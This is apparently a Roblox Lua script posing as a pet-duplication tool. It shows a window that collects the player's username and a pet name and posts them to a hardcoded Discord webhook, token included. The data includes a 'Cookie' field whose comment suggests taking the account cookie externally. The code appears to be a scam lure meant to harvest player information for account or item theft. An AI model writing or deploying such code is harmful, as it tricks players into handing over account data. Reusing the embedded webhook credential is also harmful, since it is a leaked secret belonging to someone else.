local player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PetDupeUI"
screenGui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 350, 0, 140)
frame.Position = UDim2.new(0.5, -175, 0.5, -70)
frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local inputBox = Instance.new("TextBox")
inputBox.Size = UDim2.new(1, -20, 0, 40)
inputBox.Position = UDim2.new(0, 10, 0, 10)
inputBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
inputBox.TextColor3 = Color3.new(1, 1, 1)
inputBox.Font = Enum.Font.Gotham
inputBox.TextSize = 22
inputBox.PlaceholderText = "Enter pet name here..."
inputBox.ClearTextOnFocus = false
inputBox.Parent = frame

local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 60)
sendButton.BackgroundColor3 = Color3.fromRGB(75, 150, 75)
sendButton.TextColor3 = Color3.new(1, 1, 1)
sendButton.Font = Enum.Font.GothamBold
sendButton.TextSize = 24
sendButton.Text = "Send Info"
sendButton.Parent = frame

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -20, 0, 30)
statusLabel.Position = UDim2.new(0, 10, 0, 110)
statusLabel.BackgroundTransparency = 1
statusLabel.TextColor3 = Color3.fromRGB(255, 150, 150)
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextSize = 18
statusLabel.TextXAlignment = Enum.TextXAlignment.Center
statusLabel.Parent = frame

local function sendToWebhook(data)
    print("Sending to webhook:")
    print(data)
    pcall(function()
        HttpService:PostAsync("https://discord.com/api/webhooks/1375595906250051795/n7LhadF9JTRfDThypkVKZp2OMuDQ9_BFsddANUBhhzxi1A3XHUKmPdLHLWsUUsrC2ItG", HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
end

sendButton.MouseButton1Click:Connect(function()
    local petName = inputBox.Text
    if petName == "" then
        statusLabel.Text = "Please enter a pet name."
        return
    end

    local data = {
        Username = player.Name,
        Pet = petName,
        -- Cookie cannot be accessed in-game; leave blank or get externally
        Cookie = "N/A"
    }

    sendToWebhook(data)
    statusLabel.Text = "Info sent successfully."
end)
